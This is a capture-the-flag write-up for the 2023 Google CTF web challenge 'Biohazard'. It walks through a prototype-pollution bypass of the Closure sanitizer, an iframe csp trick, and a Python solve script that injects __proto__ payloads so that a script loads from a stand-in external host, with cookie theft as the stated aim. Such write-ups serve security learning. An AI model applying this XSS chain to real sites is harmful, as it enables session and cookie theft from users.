@@ -1,0 +1,254 @@
+---
+title: "Google CTF: Biohazard"
+author: "Matthew Shen"
+date: "2023-07-09"
+slug: gctf-2023-web-biohazard
+tags:
+  - CTF Writeup
+---
+
+Challenge: `https://capturetheflag.withgoogle.com/challenges/web-biohazard`  
+IP: `https://biohazard-web.2023.ctfcompetition.com/`  
+
+***
+
+## Introduction
+
+Biohazard was a web challenge in the 2023 Google Capture the Flag event. In total 14 teams solved this challenge and the final score for this challenge was 333 points. Although I was not able to solve this challenge during the competition, I did revisit it after the end and worked through it with the help of the [official writeup](https://github.com/google/google-ctf/blob/master/2023/web-biohazard/solution/README.md).
+
+*It also seems that this challenge works best in Chrome and Chromium-based browsers due to Trusted Types only being supported in Chrome 83+ and not in Firefox or Safari.*
+
+This challenge provides a [zip file](https://storage.googleapis.com/gctf-2023-attachments-project/cab54183ea79c02df3b72d8e7af82e04957ed2e7c078e97dee5f333ecf9329ea6f1696ad3f5ada440326c25305a4b3aca6bd8f226ddc42d324f4a5b2b33dc387.zip) with the following Express JS web application.
+
+```
+├── bot.js
+├── Dockerfile
+├── src
+│   ├── app.js
+│   ├── js
+│   │   ├── package.json
+│   │   ├── package-lock.json
+│   │   ├── src
+│   │   │   ├── editor.js
+│   │   │   ├── main.js
+│   │   │   └── sanitizer.js
+│   │   └── static
+│   │       ├── bootstrap.js
+│   │       ├── editor.js
+│   │       ├── editor.js.map
+│   │       ├── main.js
+│   │       ├── main.js.map
+│   │       ├── README.md
+│   │       ├── sanitizer.js
+│   │       └── sanitizer.js.map
+│   ├── package.json
+│   ├── package-lock.json
+│   └── views
+│       └── main.ejs
+└── start.sh
+```
+
+## Objective of the challenge
+
+Before we begin to look for an exploit to get the flag, it is a good idea to determine possible exploitation strategies. Based on the presence of the the `bot.js` file and the "Report Bio" button when viewing a specific bio, we can assume that we are working towards an XSS attack. This is a very common XSS challenge setup where we need to find an XSS vulnerability, craft a page that exploits this vulnerability and then send the URL for that page to the bot which will open and run the XSS payload. Based on my passed experience, we usually need to exfiltrate the flag from the cookies of the bot user.
+
+## Overview of the web application
+
+The web application allows us to submit a Bio which contains fields such as name, introduction, favorite foods, hobbies, favorite sports and a YouTube video which will be iframed into the introduction. These fields are submitted through a POST request of `Content-Type: application/json` and the favorites are submitted as a nested dictionary. The introduction field is text that is inserted into the `/view/[bio_id]` page. However, this is protected from XSS attacks by Google's own Closure Library which is used by Google to protect their production software from XSS attacks. Our goal is to somehow bypass these XSS protects and get an XSS exploit.
+
+## Prototype pollution
+
+One of the vulnerabilities in this web application is prototype pollution. Before using it to exploit this challenge, I first did some research to understand how it works.
+
+Prototype pollution is a vulnerability that may exist in programs written in languages with prototype-based inheritance. If we are able to modify or "pollute" the global object prototype, this will be inherited by objects that inherit from that object. The consequence is that this vulnerability can allow us as an attacker to control the property of an object. To see how polluting the prototype can control the property of an object we can purposefully pollute the global object in a JavaScript console.
+
+```js
+Object.prototype.polluted = true
+let obj = {}
+obj.polluted === true
+```
+
+In this example, even though `obj` doesn't have a "`polluted`" property, it is still defined as `true` because it was set in the `Object.prototype`.
+
+<small>[Source (PortSwigger) and more information on prototype pollution](https://portswigger.net/web-security/prototype-pollution)</small>
+
+### WTF is `Object.prototype.__proto__`????
+
+By reading the mdn web docs, we can learn that `obj.__proto__` returns the prototype of an object which usually by default should be `Object.prototype` but can also be overwritten to pollute the prototype.
+
+```
+let obj = {a: 1, b: 2, "__proto__": {"polluted": true}}
+Object.getPrototypeOf(obj) // { polluted: true }
+```
+
+<small>[Source (Mozilla mdn web docs)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)</small>
+
+### How does prototype pollution manifest in this challenge?
+
+Now that we understand prototype pollution, the next obvious question is which part of this web application is vulnerable to web application is vulnerable to it. It turns out that even though `Object.assign(target, source)` is not vulnerable to prototype pollution, its specific implementation in this challenge is unsafe.
+
+We can see that `Object.assign()` is not vulnerable to prototype pollution.
+
+```js
+let obj = {"a": 1, "b": 2}
+Object.assign(obj, JSON.parse('{"__proto__": {"polluted": "true"}}'))
+obj.polluted === undefined
+```
+
+However, if we call `Object.assign()` with the target set as the prototype of obj, we can pollute it.
+
+```js
+let obj = {"a": 1, "b": 2}
+Object.assign(obj.["__proto__"], JSON.parse('{"polluted": true}'))
+obj.polluted === true
+```
+
+Finally, we can examine the code. Specifically, lines 27-46 in `main.js`.
+```js
+interestObj = {"favorites":{}};
+const uuid = viewPath[1];
+const xhr = new XMLHttpRequest();
+xhr.addEventListener("load", () => {
+  if (xhr.status === 200) {
+    const json = JSON.parse(xhr.response);
+    for (const key of Object.keys(json)) {
+      if (interestObj[key] === undefined) {
+        interestObj[key] = json[key];
+      } else{
+        Object.assign(interestObj[key], json[key]);
+      }
+    }
+  } else {
+    alert(xhr.response);
+    location.href = '/';
+  }
+});
+xhr.open('GET', `/bio/${uuid}`, false);
+xhr.send();
+```
+
+To understand this code, it is important to understand what is user controlled. The `xhr.response` is user controlled since it is the response body of the GET request to `/bio/<UUID>` and a `/bio/<UUID>` page by sending a POST request to `/create`. The following `curl` command can be used to send a POST to create a new bio.
+
+```sh
+curl 'https://biohazard-web.2023.ctfcompetition.com/create' \
+  -X POST \
+  -H 'content-type: application/json' \
+  --data-raw '{"name":"test","introduction":"","favorites":{"hobbies":"","sports":""}, "__proto__": {"polluted": true}}' \
+```
+
+Now that we know how to control `xhr.response`, we see that `main.js` passes `xhr.response` to `JSON.parse()`. Interestingly, `JSON.parse()` does not treat `__proto__` as special in any way. Therefore, `Object.keys(json)` returns `[ 'name', 'introduction', 'favorites', '__proto__' ]`.
+
+So, let's walk through the `for (const key of Object.keys(json)) {...}` loop. First, it will loop through name, introduction and favorites. Finally, it will reach the key `__proto__`. Since `interestObj` does have a prototype, `interestObj["__proto__"]` will not be undefined. Therefore, the else block will be executed as `Object.assign(interestObj["__proto__"], {"polluted": true})`. \(note: `json["__proto__"] === {"polluted": true}`\).
+
+Also, notice that the prototype that since `interestObj["__proto__"]` is in fact the `Object.prototype` (we can test this equality using a JavaScript console), we have now successfully polluted the `Object.prototype`. This is significant since we can now set values for variables at the global scope.
+
+At this point we have successfully found a prototype pollution vulnerability in the Biohazard web app. We can even test this by creating an object in the browser's JavaScript console and checking for the `polluted` property.
+
+## Bypassing Google Closure sanitizer using Prototype Pollution
+
+Based on [research by Michał Bentkowski](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has), we know that we can bypass the Closure sanitizer if we find a prototype pollution vulnerability.
+
+Internally, the Closure sanitizer uses a whitelist which can be found in the [attributeallowlists.js](https://github.com/google/closure-library/blob/master/closure/goog/html/sanitizer/attributeallowlists.js) file. It used the following format where `TAG_NAME` is a specific tag, `*` is a wildcard for any tag and `ATTRIBUTE_NAME` is a specific attribute:
+
+```js
+const AllowedAttributes = {
+  [...]
+  "TAG_NAME ATTRIBUTE_NAME": true,
+  "* ATTRIBUTE_NAME": true,
+  [...]
+}
+```
+
+So using our prototype pollution vulnerability, we can inject new tags and attributes into the `AllowedAttributes` by adding `{"__proto__": {"TAG_NAME ATTRIBUTE_NAME": true}}` to the create POST request.
+
+Now that we are able to bypass the Closure sanitizer, all we need to do is bypass the protections defined by the Strict Content Security Policy (CSP) and the Trusted types enforcement.
+
+## Finding the XSS vulnerability
+
+In `main.js`, we find the following code snippet.
+
+```js
+import {trustedResourceUrl} from 'safevalues';
+import {safeScriptEl} from 'safevalues/dom';
+
+[...]
+
+function loadEditorResources() {
+  [...]
+  const script = document.createElement('script');
+  safeScriptEl.setSrc(script, trustedResourceUrl(editor));
+  document.body.appendChild(script);
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  render();
+  if (!location.pathname.startsWith('/view/')) {
+    loadEditorResources();
+  }
+});
+```
+
+And it gets the `editor` variable from `bootstrap.js`.
+
+```js
+if (!location.pathname.startsWith('/view/')) {
+  [...]
+  editor = (x=>x)`/static/editor.js`;
+}
+```
+
+Let's walkthrough this excerpt of `main.js` code step-by-step to understand its control flow. Once the `DOMContentLoaded` event is triggered, we call the `render()` function and then conditionally call the `loadEditorResources()` function if the `location.pathname` does not start with `/view/`. Specifically, we are interesting in the last three lines of this function. Firstly, a script element is created and then we use the [`safeScriptEl.setSrc()`](https://github.com/google/safevalues/blob/main/src/dom/xss-dom-remediation.md#assigning-to-htmlscriptelementsrc-) to set the src of the script element. The source of the script must be of type `trustedResourceUrl`. Reading the [documentation of TrustedResourceUrl](https://github.com/google/safevalues/tree/main/src#trustedresourceurl), I learned that we can construct a `trustedResourceUrl` by using a [tagged template function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates) like so: `` trustedResourceUrl`/static/editor.js` ``. However, this is just syntactic sugar for the following: `trustedResourceUrl(["/static/editor.js"])`. Finally, the script element with its src is appended to the `document.body`.
+
+So, now all that we need to do is set the `editor` variable (the argument passed to `trustedResourceUrl()`) to point to our malicious JavaScript code and we would have a complete XSS vulnerability. And although we do have a prototype vulnerability that we can and will use to control the `editor` variable, it would be overwritten in `bootstrap.js`.
+
+### Blocking `bootstrap.js`
+
+Well, once we find a way to overwrite the `editor` variable, we still need to get rid of the pesky `bootstrap.js` which would overwrite it. A neat trick that we can use is an iframe and use the csp attribute to enforce a content security policy on the embedded document (note this is once again an experimental feature only present in Chrome 61+ but not in Firefox or Safari). So we could use the following iframe to block  `bootstrap.js` from being loaded in the document in the iframe.
+
+```js
+<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_uuid]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
+```
+
+### Overwriting the `editor` variable and getting the XSS
+
+Although the ultimate goal for this challenge is to exfiltrate the bot's `document.cookie`, as a proof of concept, we will just execute `alert()` and `console.log()`. I use the following snippet of JavaScript as the payload.
+
+```js
+alert(`payload.js says: ${window.origin}`)
+console.log(`payload.js says: ${window.origin}`)
+```
+
+I used the prototype pollution we explored earlier to maliciously control the `editor` variable and point to my malicious JavaScript file. This bio will then be iframed so that the script pointed to by `editor` is run while `bootstrap.js` remains blocked. It is also important to note that since our persistent XSS is on `/view/[bio_uuid]`, we need a way for `loadEditorResources()` to be called (since it is not called when the pathname starts with `/view/`). The trick is to use `/foo/view/[bio_uuid]`. The reason this works is because, a) the pathname no longer starts `/view/` and b) this is a single page application that discards everything in the pathname before `/view/` and treats everything after it as the bio UUID. Lastly, we use the prototype pollution vulnerability to bypass the Closure sanitizer and allow the iframe to also have the CSP attribute.
+
+I wrote the following Python script to create the first bio which overwrites the `editor` and the second bio which iframes the first one with the specific CSP.
+
+```py
+#!/usr/bin/env python
+import requests
+
+URL = "https://biohazard-web.2023.ctfcompetition.com"
+
+headers = {
+    'content-type': 'application/json',
+}
+
+first_id = requests.post(f"{URL}/create", headers=headers, json={"name":"test","introduction":"","favorites":{"hobbies":"","sports":""}, "__proto__": {"editor": ["http://flyme2bluemoon.example/payload.js"]}}).json()["id"]
+
+print(f"iframe url: {URL}/view/{first_id}")
+
+data=f'{{"name":"test","introduction":"<iframe src=\\"{URL}/foo/view/{first_id}\\" csp=\\"script-src http://flyme2bluemoon.example/payload.js {URL}/static/closure-library/ {URL}/static/sanitizer.js {URL}/static/main.js \'unsafe-inline\' \'unsafe-eval\'\\"></iframe>","favorites":{{"hobbies":"","sports":""}}, "__proto__": {{"IFRAME CSP": true}}}}'
+second_id = requests.post(f"{URL}/create", headers=headers, data=data).json()["id"]
+
+print(f"report url: {URL}/view/{second_id}")
+```
+
+```sh
+┌──(mshen㉿kali)-[~/gctf-2023/biohazard/solution]
+└─$ ./solve.py
+iframe url: https://biohazard-web.2023.ctfcompetition.com/view/e96118c6-75bc-44bf-a62e-f1ef2fdae1f7
+report url: https://biohazard-web.2023.ctfcompetition.com/view/9c1c9720-f454-4a68-b7f3-bcf9f058ffd9
+```
+
+## Conclusion
+
+Even though I was not able to solve this challenge during the official Google CTF time period, it was really fun to work through it after the fact. Thanks to [Jun Kokatsu (@shhnjk)](https://twitter.com/shhnjk) for putting together this realistic challenge. As stated in the purpose section of the solution, I love how this challenge mimics a common setup used by production systems at Alphabet (Google). Itt was great to review some concepts I previously knew, rediscover how they can be leveraged in different ways and to learn about completely new web vulnerabilites.
